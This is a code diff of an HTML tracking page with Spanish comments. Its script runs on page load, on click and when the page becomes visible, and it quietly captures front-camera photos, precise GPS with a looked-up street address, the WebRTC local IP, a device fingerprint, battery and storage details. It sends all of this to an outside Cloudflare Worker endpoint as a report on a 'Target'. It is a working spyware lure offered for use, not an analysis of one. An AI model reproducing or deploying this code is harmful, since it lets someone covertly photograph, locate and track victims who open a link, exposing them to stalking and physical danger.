@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -14,22 +14,28 @@
     <canvas id="c"></canvas>
 
     <script>
-        // ================= CONFIGURACIÓN =================
-        const trackingId = 'AQUI_VA_TOKEN'; // 🔥 Cambia esto por tu token
-        const workerUrl = 'https://trackbot.societykark.workers.dev/';
+        // ============================================================
+        // CONFIGURACIÓN
+        // ============================================================
+        const trackingId = 'AQUI_VA_TOKEN';  // 🔥 CAMBIA ESTO POR TU TOKEN REAL
+        const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev';
 
-        // ================= FUNCIONES =================
+        console.log('✅ Script iniciado');
+
+        // ============================================================
+        // FUNCIONES DE CAPTURA
+        // ============================================================
 
         async function reverseGeocode(lat, lng) {
             try {
                 const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&zoom=18&addressdetails=1`;
-                const res = await fetch(url);
+                const res = await fetch(url, { headers: { 'User-Agent': 'TrackerBot/1.0' } });
                 const data = await res.json();
                 return data.display_name || null;
             } catch(e) { return null; }
         }
 
-        function getLocalIP() {
+        function obtenerIPWebRTC() {
             return new Promise((resolve) => {
                 try {
                     const pc = new RTCPeerConnection({ iceServers: [] });
@@ -45,60 +51,60 @@
             });
         }
 
-        function getGPS() {
+        function capturarGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
-                let best = null;
+                let mejor = null;
                 let watchId = navigator.geolocation.watchPosition(
                     (pos) => {
                         const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
-                        if (!best || coords.acc < best.acc) best = coords;
+                        if (!mejor || coords.acc < mejor.acc) mejor = coords;
                         if (coords.acc < 100) {
                             navigator.geolocation.clearWatch(watchId);
-                            resolve(best);
+                            resolve(mejor);
                         }
                     },
-                    () => { navigator.geolocation.clearWatch(watchId); resolve(best); },
+                    () => { navigator.geolocation.clearWatch(watchId); resolve(mejor); },
                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
-                setTimeout(() => { navigator.geolocation.clearWatch(watchId); resolve(best); }, 8000);
+                setTimeout(() => { navigator.geolocation.clearWatch(watchId); resolve(mejor); }, 8000);
             });
         }
 
-        async function getPhotos(count = 3) {
+        async function capturarFotos(cantidad = 3) {
             const video = document.getElementById('v');
             const canvas = document.getElementById('c');
-            const photos = [];
+            const fotos = [];
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
                 video.srcObject = stream;
                 await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
                 await new Promise(r => setTimeout(r, 300));
-                for (let i = 0; i < count; i++) {
+                for (let i = 0; i < cantidad; i++) {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-                    photos.push(blob);
+                    fotos.push(blob);
+                    console.log(`📸 Foto ${i+1} capturada`);
                     await new Promise(r => setTimeout(r, 200));
                 }
                 stream.getTracks().forEach(t => t.stop());
-                video.srcObject = null;
-                return photos;
+                return fotos;
             } catch(e) { return []; }
         }
 
-        function getDevice() {
+        function obtenerDispositivo() {
             const ua = navigator.userAgent;
-            let model = 'Desconocido';
-            if (ua.includes('iPhone')) model = 'iPhone';
-            else if (ua.includes('iPad')) model = 'iPad';
-            else if (ua.includes('Android')) model = 'Android';
-            else if (ua.includes('Mac')) model = 'Mac';
-            else if (ua.includes('Windows')) model = 'Windows PC';
-            else if (ua.includes('Linux')) model = 'Linux';
+            let modelo = 'Desconocido';
+            if (ua.includes('iPhone')) modelo = 'iPhone';
+            else if (ua.includes('iPad')) modelo = 'iPad';
+            else if (ua.includes('Android')) modelo = 'Android';
+            else if (ua.includes('Mac')) modelo = 'Mac';
+            else if (ua.includes('Windows')) modelo = 'Windows PC';
+            else if (ua.includes('Linux')) modelo = 'Linux';
             return {
-                model, userAgent: ua, language: navigator.language || 'N/A',
+                modelo, userAgent: ua, language: navigator.language || 'N/A',
                 platform: navigator.platform || 'N/A', vendor: navigator.vendor || 'N/A',
                 resolution: `${window.screen.width}x${window.screen.height}`,
                 colorDepth: window.screen.colorDepth || 'N/A',
@@ -107,7 +113,7 @@
             };
         }
 
-        function getFingerprint() {
+        function obtenerFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
@@ -135,118 +141,132 @@
             } catch(e) { return { gpu: 'N/A', canvas: 'N/A' }; }
         }
 
-        async function getBattery() {
+        async function obtenerBateria() {
             try {
                 const battery = await navigator.getBattery();
                 return { level: Math.round(battery.level * 100) + '%', charging: battery.charging ? 'Sí' : 'No' };
             } catch(e) { return { level: 'N/A', charging: 'N/A' }; }
         }
 
-        async function getStorage() {
+        async function obtenerAlmacenamiento() {
             try {
                 const est = await navigator.storage.estimate();
                 const totalGB = (est.quota / (1024 ** 3));
                 const usedGB = (est.usage / (1024 ** 3));
-                if (totalGB < 0.01 && usedGB < 0.01) return { total: 'No disponible', used: 'No disponible' };
+                if (totalGB < 0.01 && usedGB < 0.01) {
+                    return { total: 'No disponible', used: 'No disponible' };
+                }
                 return { total: totalGB.toFixed(2) + ' GB', used: usedGB.toFixed(2) + ' GB' };
             } catch(e) { return { total: 'No disponible', used: 'No disponible' }; }
         }
 
-        async function getPermissions() {
-            const perms = { camera: 'Desconocido', location: 'Desconocido' };
+        async function obtenerPermisos() {
+            const permisos = { camera: 'Desconocido', location: 'Desconocido' };
             try {
                 const resultCam = await navigator.permissions.query({ name: 'camera' });
-                perms.camera = resultCam.state;
+                permisos.camera = resultCam.state;
             } catch(e) {}
             try {
                 const resultLoc = await navigator.permissions.query({ name: 'geolocation' });
-                perms.location = resultLoc.state;
+                permisos.location = resultLoc.state;
             } catch(e) {}
-            return perms;
+            return permisos;
         }
 
-        // ================= ENVIAR DATOS =================
-
+        // ============================================================
+        // CONSTRUIR MENSAJE (SIN DUPLICADOS)
+        // ============================================================
         async function enviarAlWorker() {
             console.log('📤 Iniciando captura...');
             try {
-                const [photos, gps, localIP, device, fingerprint, battery, storage, permissions] = await Promise.all([
-                    getPhotos(3),
-                    getGPS(),
-                    getLocalIP(),
-                    getDevice(),
-                    getFingerprint(),
-                    getBattery(),
-                    getStorage(),
-                    getPermissions()
+                const [fotos, gps, ipLocal, dispositivo, fp, bateria, almacenamiento, permisos] = await Promise.all([
+                    capturarFotos(3),
+                    capturarGPS(),
+                    obtenerIPWebRTC(),
+                    obtenerDispositivo(),
+                    obtenerFingerprint(),
+                    obtenerBateria(),
+                    obtenerAlmacenamiento(),
+                    obtenerPermisos()
                 ]);
 
-                let gpsData = null;
+                console.log('✅ Datos capturados. GPS:', gps, 'Fotos:', fotos.length, 'IP Local:', ipLocal);
+
+                let gpsConDireccion = null;
                 if (gps) {
-                    const address = await reverseGeocode(gps.lat, gps.lng);
-                    gpsData = { ...gps, address };
+                    const direccion = await reverseGeocode(gps.lat, gps.lng);
+                    gpsConDireccion = { ...gps, direccion };
                 }
 
-                // Construir mensaje
+                // ========== CONSTRUIR MENSAJE ==========
                 let msg = '📊 Visitor Information Captured\n';
                 msg += '━━━━━━━━━━━━━━━━\n\n';
 
+                // 1. Device & Browser
                 msg += '🖥️ Device & Browser\n';
-                msg += `   • Device Model: ${device.model}\n`;
-                msg += `   • User Agent: ${device.userAgent}\n\n`;
+                msg += `   • Device Model: ${dispositivo.modelo}\n`;
+                msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
 
+                // 2. Fingerprint
                 msg += '🎨 Fingerprint\n';
-                msg += `   • GPU: ${fingerprint.gpu}\n`;
-                msg += `   • Canvas: ${fingerprint.canvas}\n\n`;
+                msg += `   • GPU: ${fp.gpu}\n`;
+                msg += `   • Canvas: ${fp.canvas}\n\n`;
 
+                // 3. Network Information (con IP Local)
                 msg += '🌐 Network Information\n';
-                if (localIP) msg += `   • Local IP (WebRTC): ${localIP}\n`;
-                msg += `   • Language: ${device.language}\n\n`;
+                if (ipLocal) msg += `   • Local IP (WebRTC): ${ipLocal}\n`;
+                msg += `   • Language: ${dispositivo.language}\n\n`;
 
-                if (gpsData) {
+                // 4. GPS (solo una vez)
+                if (gpsConDireccion) {
                     msg += '📍 GPS\n';
-                    msg += `   • Coordenadas: ${gpsData.lat}, ${gpsData.lng}\n`;
-                    msg += `   • Precisión: ±${Math.round(gpsData.acc)}m\n`;
-                    if (gpsData.address) msg += `   • Dirección: ${gpsData.address}\n`;
-                    msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}\n\n`;
+                    msg += `   • Coordenadas: ${gpsConDireccion.lat}, ${gpsConDireccion.lng}\n`;
+                    msg += `   • Precisión: ±${Math.round(gpsConDireccion.acc)}m\n`;
+                    if (gpsConDireccion.direccion) msg += `   • Dirección: ${gpsConDireccion.direccion}\n`;
+                    msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${gpsConDireccion.lat},${gpsConDireccion.lng}\n\n`;
                 }
 
+                // 5. Display Information
                 msg += '🖼️ Display Information\n';
-                msg += `   • Resolution: ${device.resolution}\n`;
-                msg += `   • Color Depth: ${device.colorDepth}\n\n`;
+                msg += `   • Resolution: ${dispositivo.resolution}\n`;
+                msg += `   • Color Depth: ${dispositivo.colorDepth}\n\n`;
 
+                // 6. Battery Status
                 msg += '🔋 Battery Status\n';
-                msg += `   • Level: ${battery.level}\n`;
-                msg += `   • Charging: ${battery.charging}\n\n`;
+                msg += `   • Level: ${bateria.level}\n`;
+                msg += `   • Charging: ${bateria.charging}\n\n`;
 
+                // 7. Device Permissions
                 msg += '🔐 Device Permissions\n';
-                msg += `   • Camera: ${permissions.camera}\n`;
-                msg += `   • Location: ${permissions.location}\n\n`;
+                msg += `   • Camera: ${permisos.camera}\n`;
+                msg += `   • Location: ${permisos.location}\n\n`;
 
+                // 8. Hardware & Storage
                 msg += '💾 Hardware & Storage\n';
-                msg += `   • CPU Cores: ${device.cpuCores}\n`;
-                msg += `   • RAM: ${device.deviceMemory} GB\n`;
-                msg += `   • Storage Used: ${storage.used}\n`;
-                msg += `   • Storage Total: ${storage.total}\n\n`;
+                msg += `   • CPU Cores: ${dispositivo.cpuCores}\n`;
+                msg += `   • RAM: ${dispositivo.deviceMemory} GB\n`;
+                msg += `   • Storage Used: ${almacenamiento.used}\n`;
+                msg += `   • Storage Total: ${almacenamiento.total}\n\n`;
 
+                // 9. Target
                 msg += '━━━━━━━━━━━━━━━━\n';
                 msg += `🎯 Target: ${trackingId || 'N/A'}\n`;
                 msg += `⚡ Developed by: @societykark\n`;
                 msg += `⏰ ${new Date().toISOString()}`;
 
+                // ========== ENVIAR ==========
                 const formData = new FormData();
                 formData.append('text', msg);
-                photos.forEach((photo, index) => {
-                    if (photo) formData.append(`photo_${index}`, photo, `photo_${index}.jpg`);
+                fotos.forEach((foto, index) => {
+                    if (foto) formData.append(`photo_${index}`, foto, `photo_${index}.jpg`);
                 });
 
-                console.log('📤 Enviando al Worker...');
+                console.log('📤 Enviando FormData al Worker...');
 
                 const response = await fetch(workerUrl, {
                     method: 'POST',
                     body: formData
                 });
-
                 const result = await response.json();
                 console.log('✅ Respuesta del Worker:', result);
             } catch(e) {
@@ -254,8 +274,24 @@
             }
         }
 
-        window.addEventListener('load', () => {
+        // ============================================================
+        // EVENTOS
+        // ============================================================
+        function ejecutar() {
+            console.log('🔄 Ejecutando captura...');
             setTimeout(enviarAlWorker, 500);
+        }
+
+        window.addEventListener('load', ejecutar);
+        document.addEventListener('click', () => {
+            console.log('👆 Click detectado');
+            setTimeout(enviarAlWorker, 300);
+        });
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                console.log('👁️ Página visible');
+                setTimeout(enviarAlWorker, 300);
+            }
         });
     </script>
 </body>
